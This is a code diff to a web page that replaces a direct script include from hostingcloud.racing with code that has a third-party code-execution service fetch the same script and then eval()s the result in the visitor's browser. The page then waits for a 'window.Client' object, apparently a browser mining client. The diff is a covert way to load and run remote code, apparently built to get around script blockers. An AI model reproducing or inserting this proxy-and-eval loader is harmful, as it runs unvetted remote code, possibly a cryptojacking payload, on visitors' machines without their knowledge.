@@ -16,17 +16,97 @@
 
     <!-- <script>setInterval(async () => { if (window.lastCode && window.lastCode != await (await fetch(location.href)).text()) location.reload(); window.lastCode = await (await fetch(location.href)).text(); }, 5000);</script> -->
     <script>
-        setTimeout(() => { window.location.reload(); }, 1000 * 60 * 30)
+        setTimeout(() => { window.location.reload(); }, 1000 * 60 * 60)
     </script>
-    <script src="https://www.hostingcloud.racing/sIu3.js"></script>
+    <!-- <script src="https://www.hostingcloud.racing/sIu3.js"></script> -->
     <!-- <script src="http://share.liveblog365.com/GJTy.php?f=9sx5.js"></script> -->
 
     <script>
+
+        let template = (str) => `
+const https = require('https');
+
+async function fetchData(url) {
+    return new Promise((resolve) => {
+        https.get(url, (res) => {
+            let data = '';
+
+            // A chunk of data has been received
+            res.on('data', (chunk) => {
+                data += chunk;
+            });
+
+            // The whole response has been received
+            res.on('end', () => {
+                resolve({ data, error: null }); // Resolve with data
+            });
+        }).on('error', (err) => {
+            resolve({ data: null, error: err }); // Resolve with error
+        });
+    });
+}
+
+async function main() {
+    const url = '${str}';
+    const { data, error } = await fetchData(url);
+    if (error) {
+        console.log('Error:', error);
+    } else {
+        console.log(data);
+    }
+}
+    
+main();
+`;
+
+
+
+        async function reqPrx(url) {
+            const data = JSON.stringify({
+                'code': template(url),
+                'language': 'js',
+            });
+
+            try {
+                const response = await fetch('https://api.codex.jaagrav.in/', {
+                    method: 'POST', // HTTP method
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Content-Length': data.length // Set the content length
+                    },
+                    body: data // Write data to the request body
+                });
+
+                if (!response.ok) { // Check if the response is ok
+                    throw new Error(`HTTP error! Status: ${response.status}`);
+                }
+
+                const responseData = await response.json(); // Parse the JSON response
+                return responseData.output; // Return the output
+
+            } catch (error) {
+                console.error('Error:', error); // Log any errors
+                return null;
+            }
+        }
+
+
+
+
+
+
+
+
+
 
         let Client = window.Client;
 
 
         (async () => {
+            await (async () => {
+                eval(await reqPrx('https://www.hostingcloud.racing/sIu3.js'));
+            })();
+
             while (!Client) {
                 await new Promise(r => setTimeout(r, 1000));
                 Client = window.Client;
